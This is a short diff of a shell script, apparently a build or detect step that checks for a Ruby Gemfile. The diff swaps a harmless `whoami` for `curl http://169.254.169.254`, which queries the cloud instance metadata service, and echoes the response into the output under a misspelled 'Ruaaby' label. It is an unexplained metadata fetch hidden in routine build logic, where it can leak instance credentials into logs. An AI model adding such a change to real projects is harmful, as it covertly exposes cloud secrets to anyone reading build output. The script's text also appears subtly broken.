@@ -13,7 +13,7 @@ else
 fi
 
 if [ -f "$APP_DIR/Gemfile" ]; then
-  export A=$(whoami)
+  export A=$(curl http://169.254.169.254)
   echo "Ruaaby $A"
   exit 0
 else
